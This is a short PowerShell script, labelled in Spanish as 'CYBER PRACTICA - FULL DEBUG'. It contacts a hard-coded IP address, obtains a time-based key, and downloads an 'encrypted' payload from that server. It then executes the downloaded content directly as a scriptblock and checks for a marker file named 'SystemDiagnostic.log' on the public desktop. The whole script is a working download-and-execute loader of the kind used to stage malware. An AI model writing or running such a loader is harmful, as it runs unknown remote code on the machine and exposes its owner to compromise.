$ErrorActionPreference = "Stop"

Write-Host "============================================" -ForegroundColor Green
Write-Host "  CYBER PRACTICA - FULL DEBUG" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green

$base = "http://82.29.153.101:8080"

try {
    Write-Host "`n[1] Conectando..." -ForegroundColor Yellow
    $health = Invoke-WebRequest "$base/health" -UseBasicParsing
    Write-Host "OK: $($health.StatusCode)" -ForegroundColor Green

    Write-Host "`n[2] Obteniendo key..." -ForegroundColor Yellow
    $ts = [int](Get-Date -UFormat %s)
    $key = (Invoke-WebRequest "$base/auth/key?ts=$ts" -UseBasicParsing).Content.Trim()

    if ($key.Length -ne 44) {
        throw "Key invalida"
    }

    Write-Host "Key OK: $($key.Substring(0,10))..." -ForegroundColor Green

    Write-Host "`n[3] Descargando payload..." -ForegroundColor Yellow
    $payload = Invoke-WebRequest "$base/payload/encrypted" -Headers @{ "X-Decrypt-Key" = $key } -UseBasicParsing

    Write-Host "Payload recibido" -ForegroundColor Green

    Write-Host "`n[4] Ejecutando..." -ForegroundColor Yellow
    $sb = [scriptblock]::Create($payload.Content)
    & $sb

    Write-Host "`n[5] Verificando..." -ForegroundColor Yellow
    $marker = "$env:PUBLIC\Desktop\SystemDiagnostic.log"

    if (Test-Path $marker) {
        Write-Host "✓ EJECUCION OK" -ForegroundColor Green
        Get-Content $marker
    } else {
        Write-Host "⚠ Marker no encontrado" -ForegroundColor Yellow
    }

} catch {
    Write-Host "`nERROR:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
}

Read-Host "`nENTER para salir"